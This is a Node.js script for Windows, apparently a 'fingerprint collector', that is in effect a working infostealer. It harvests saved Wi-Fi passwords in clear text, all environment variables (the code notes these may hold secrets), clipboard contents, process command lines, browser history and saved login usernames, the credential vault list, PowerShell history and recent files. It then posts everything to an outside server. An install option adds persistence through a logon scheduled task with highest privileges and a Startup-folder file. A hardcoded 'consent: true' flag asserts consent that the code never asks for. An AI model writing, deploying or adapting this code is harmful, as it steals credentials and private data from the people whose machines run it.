#!/usr/bin/env node
import os from 'node:os';
import { execSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import https from 'node:https';

const SERVER = process.env.COLLECT_SERVER || 'https://finger-mrkr.onrender.com';
const INSTALL = process.argv.includes('--install');
const CONFIG_PATH = path.join(os.homedir(), '.fingerprint-collector.json');

function run(cmd, timeout = 15000) {
  try {
    const r = execSync(cmd, { encoding: 'utf8', timeout, stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true });
    return r.trim();
  } catch (e) {
    return '[ERROR] ' + (e.stderr ? e.stderr.trim().slice(0, 500) : e.message);
  }
}

function runPwsh(script, timeout = 15000) {
  try {
    const r = execSync(`powershell -NoProfile -NonInteractive -Command "${script.replace(/"/g, '\\"')}"`, { encoding: 'utf8', timeout, stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true });
    return r.trim();
  } catch (e) {
    return '[ERROR] ' + (e.stderr ? e.stderr.trim().slice(0, 500) : e.message);
  }
}

function safe(fn) {
  try { return fn(); } catch (e) { return '[ERROR] ' + e.message; }
}

function truncate(str, maxLines, maxLen) {
  if (typeof str !== 'string') return str;
  const lines = str.split('\n');
  const trimmed = lines.length > maxLines ? lines.slice(0, maxLines).concat(['...TRUNCATED...']) : lines;
  const out = trimmed.join('\n');
  return out.length > (maxLen || 100000) ? out.slice(0, maxLen || 100000) + '\n...TRUNCATED...' : out;
}

// Extract readable strings resembling URLs from a SQLite binary file
function extractUrls(filePath, max = 200) {
  try {
    if (!fs.existsSync(filePath)) return [];
    const buf = fs.readFileSync(filePath);
    // SQLite text is stored as UTF-8; URLs are long enough to survive in raw pages
    const text = buf.toString('latin1');
    const urls = new Set();
    const re = /https?:\/\/[^\x00-\x20"']{8,300}/gi;
    let m;
    while ((m = re.exec(text)) && urls.size < max) {
      let u = m[0];
      // trim trailing garbage
      u = u.replace(/[\\;,>)\]}"'!]+$/g, '');
      if (u.includes('.') && !u.endsWith('.') && !u.includes('..')) urls.add(u);
    }
    return [...urls];
  } catch (e) {
    return ['[ERROR] ' + e.message];
  }
}

// Extract keyword/value pairs (e.g. account names) from browser DBs
function extractStrings(filePath, keyword, max = 100) {
  try {
    if (!fs.existsSync(filePath)) return [];
    const buf = fs.readFileSync(filePath);
    const text = buf.toString('latin1');
    const out = new Set();
    const re = new RegExp(keyword + '([^\\x00-\\x1f]{1,120})', 'gi');
    let m;
    while ((m = re.exec(text)) && out.size < max) {
      const v = m[1].replace(/[\x00-\x1f]/g, ' ');
      if (v.trim()) out.add(v.trim().slice(0, 100));
    }
    return [...out];
  } catch (e) {
    return ['[ERROR] ' + e.message];
  }
}

async function collectAll() {
  console.log('Collecting local system data...\n');
  const data = { collectedAt: new Date().toISOString(), hostname: os.hostname() };
  const home = os.homedir();

  // 1. System
  console.log(' [1/20] System info...');
  data.system = safe(() => ({
    hostname: os.hostname(), platform: os.platform(), release: os.release(), type: os.type(), arch: os.arch(),
    cpus: os.cpus().map(c => c.model), cpuCount: os.cpus().length,
    totalMemGb: (os.totalmem() / 1073741824).toFixed(2), freeMemGb: (os.freemem() / 1073741824).toFixed(2),
    uptime: os.uptime(), user: os.userInfo(), tempDir: os.tmpdir(), homeDir: home,
    osInfo: run('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory"'),
  }));

  // 2. Network interfaces
  console.log(' [2/20] Network interfaces...');
  data.networkInterfaces = safe(() => {
    const ifs = os.networkInterfaces();
    const result = {};
    for (const [name, addrs] of Object.entries(ifs)) {
      result[name] = addrs.map(a => ({ address: a.address, netmask: a.netmask, family: a.family, mac: a.mac, internal: a.internal }));
    }
    return result;
  });

  // 3. IP config
  console.log(' [3/20] IP configuration...');
  data.ipConfig = truncate(run('ipconfig /all'), 400, 60000);

  // 4. Active connections
  console.log(' [4/20] Active connections...');
  data.activeConnections = truncate(run('netstat -an 2>nul'), 600, 60000);

  // 5. DNS cache
  console.log(' [5/20] DNS cache...');
  data.dnsCache = truncate(run('ipconfig /displaydns 2>nul'), 400, 40000);

  // 6. ARP table
  console.log(' [6/20] ARP table...');
  data.arpTable = run('arp -a 2>nul');

  // 7. Wi-Fi + saved passwords (key=clear)
  console.log(' [7/20] Wi-Fi info + saved passwords...');
  const wlanProfiles = run('netsh wlan show profiles 2>nul');
  data.wifi = {
    interfaces: run('netsh wlan show interfaces 2>nul'),
    profiles: wlanProfiles,
  };
  const profileNames = (wlanProfiles.match(/All User Profile\s*:\s*(.+)/g) || []).map(l => l.split(':').slice(1).join(':').trim());
  data.wifiPasswords = profileNames.map((name) => {
    const detail = run(`netsh wlan show profile name="${name}" key=clear 2>nul`);
    const keyMatch = detail.match(/Key Content\s*:\s*(.+)/i);
    return { name, password: keyMatch ? keyMatch[1].trim() : '[not found / needs admin]' };
  });

  // 8. Environment variables (can contain tokens/secrets)
  console.log(' [8/20] Environment variables...');
  data.environment = safe(() => ({ ...process.env }));

  // 9. Clipboard
  console.log(' [9/20] Clipboard...');
  data.clipboard = runPwsh('Get-Clipboard');

  // 10. Processes with command lines
  console.log('[10/20] Processes + command lines...');
  data.processes = truncate(run('tasklist /FO CSV /NH 2>nul'), 400, 40000);
  data.processCmdLines = truncate(run('wmic process get ProcessId,Name,CommandLine /format:csv 2>nul'), 300, 40000);

  // 11. Browser data
  console.log('[11/20] Browser profiles + history + saved logins...');
  data.browsers = safe(() => {
    const browsers = {};
    const chrome = path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
    if (fs.existsSync(chrome)) {
      const dirs = fs.readdirSync(chrome).filter(d => d.endsWith('Profile') || d === 'Default');
      const profiles = {};
      for (const dir of dirs.slice(0, 5)) {
        const p = path.join(chrome, dir);
        const hist = path.join(p, 'History');
        const ck = path.join(p, 'Cookies');
        const ld = path.join(p, 'Login Data');
        const wd = path.join(p, 'Web Data');
        profiles[dir] = {
          historyUrls: extractUrls(hist, 100),
          historyCount: fs.existsSync(hist) ? fs.statSync(hist).size : 0,
          cookiesFile: fs.existsSync(ck) ? fs.statSync(ck).size + ' bytes (encrypted)' : 'not found',
          savedPasswordsFile: fs.existsSync(ld) ? fs.statSync(ld).size + ' bytes (encrypted)' : 'not found',
          autofillFile: fs.existsSync(wd) ? fs.statSync(wd).size + ' bytes (encrypted)' : 'not found',
          savedAccounts: extractStrings(ld, 'username', 30),
        };
      }
      browsers.chrome = { profiles };
    }
    const edge = path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data');
    if (fs.existsSync(edge)) {
      const dirs = fs.readdirSync(edge).filter(d => d.endsWith('Profile') || d === 'Default');
      const profiles = {};
      for (const dir of dirs.slice(0, 3)) {
        const p = path.join(edge, dir);
        profiles[dir] = {
          historyUrls: extractUrls(path.join(p, 'History'), 50),
          savedAccounts: extractStrings(path.join(p, 'Login Data'), 'username', 20),
        };
      }
      browsers.edge = { profiles };
    }
    const ff = path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
    if (fs.existsSync(ff)) {
      browsers.firefox = { profiles: fs.readdirSync(ff) };
    }
    return browsers;
  });

  // 12. Local users, groups, domain
  console.log('[12/20] Users, groups, domain...');
  data.localUsers = run('net user 2>nul');
  data.localGroups = run('net localgroup 2>nul');
  data.whoami = run('whoami /all 2>nul');

  // 13. Installed software (registry, fast)
  console.log('[13/20] Installed software...');
  data.installedSoftware = truncate(run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /v DisplayName 2>nul'), 600, 40000);

  // 14. Startup programs
  console.log('[14/20] Startup entries...');
  data.startup = {
    hkcuRun: run('reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul'),
    hklmRun: run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul'),
    startupFolder: safe(() => {
      const dir = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
      return fs.existsSync(dir) ? fs.readdirSync(dir) : [];
    }),
    scheduledTasks: truncate(run('schtasks /query /fo LIST /v 2>nul'), 150, 30000),
  };

  // 15. Recent documents
  console.log('[15/20] Recent documents...');
  data.recentDocuments = safe(() => {
    const recent = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent');
    if (!fs.existsSync(recent)) return [];
    return fs.readdirSync(recent).slice(0, 100);
  });
  data.recentPwshHistory = safe(() => {
    const ps = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine', 'ConsoleHost_history.txt');
    return fs.existsSync(ps) ? fs.readFileSync(ps, 'utf8').split('\n').filter(Boolean).slice(-50) : [];
  });

  // 16. Network shares & mapped drives
  console.log('[16/20] Network shares...');
  data.netShares = {
    shares: run('net share 2>nul'),
    mapped: run('net use 2>nul'),
  };

  // 17. USB & storage devices
  console.log('[17/20] USB & storage...');
  data.usbDevices = truncate(run('wmic path Win32_USBControllerDevice get Dependent 2>nul'), 200, 20000);
  data.diskDrives = truncate(run('wmic diskdrive get Model,Size,InterfaceType /format:csv 2>nul'), 100, 10000);
  data.diskVolumes = runPwsh('Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID,DriveType,VolumeName,Size,FreeSpace | ConvertTo-Json');

  // 18. Windows credential vault
  console.log('[18/20] Credential vault...');
  data.credentialVault = run('cmdkey /list 2>nul');

  // 19. Network adapters / VPN info
  console.log('[19/20] Network adapters...');
  data.networkAdapters = runPwsh('Get-NetAdapter | Select-Object Name,InterfaceDescription,Status,LinkSpeed | ConvertTo-Json');
  data.vpn = run('rasdial 2>nul');

  // 20. AutoLogon + default browser
  console.log('[20/20] AutoLogon & defaults...');
  data.autologon = run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName /v DefaultDomainName 2>nul');
  data.defaultBrowser = run('reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice" /v ProgId 2>nul');

  // Upload
  console.log('\nUploading to ' + SERVER + '/api/reports ...');
  const body = JSON.stringify({
    consent: true,
    consentVersion: '2026-07-safe-v1',
    fingerprint: {
      source: 'local-cli',
      local: data,
      browser_signals: { Platform: os.platform(), Hostname: os.hostname() },
    },
    events: [{ label: 'local-collect', detail: os.hostname() + ' / ' + os.platform(), at: new Date().toISOString() }],
  });
  console.log('Payload size: ' + (Buffer.byteLength(body) / 1024).toFixed(1) + ' KB');

  const url = new URL('/api/reports', SERVER);
  const mod = url.protocol === 'https:' ? https : http;

  return new Promise((resolve, reject) => {
    const req = mod.request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let resp = '';
      res.on('data', (c) => resp += c);
      res.on('end', () => {
        if (res.statusCode === 201) {
          const j = JSON.parse(resp);
          console.log('Done! Report #' + j.id + ' saved.');
          safe(() => fs.writeFileSync(CONFIG_PATH, JSON.stringify({ lastReportId: j.id, lastRun: new Date().toISOString() }, null, 2)));
        } else {
          console.log('Upload failed (' + res.statusCode + '): ' + resp);
        }
        resolve();
      });
    });
    req.on('error', (e) => { console.log('Network error: ' + e.message); resolve(); });
    req.write(body);
    req.end();
  });
}

function installAutoStart() {
  const scriptPath = path.resolve(process.argv[1]);
  const taskName = 'FingerprintLocalCollector';
  const nodeExe = process.execPath;
  const cmd = `"${nodeExe}" "${scriptPath}"`;
  console.log('Installing scheduled task: ' + taskName);
  const r = run(`schtasks /Create /SC ONLOGON /DELAY 0005:00 /TN "${taskName}" /TR "${cmd}" /F /RL HIGHEST`);
  console.log(r || 'Installed. Runs 5 min after login.');
  const startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
  const batPath = path.join(startupDir, 'FingerprintCollector.cmd');
  safe(() => {
    fs.writeFileSync(batPath, `@echo off\nstart /min "" "${nodeExe}" "${scriptPath}"\n`);
    console.log('Startup shortcut created: ' + batPath);
  });
}

async function main() {
  if (INSTALL) {
    installAutoStart();
    return;
  }
  await collectAll();
}

main().catch(e => console.error('Fatal:', e.message));
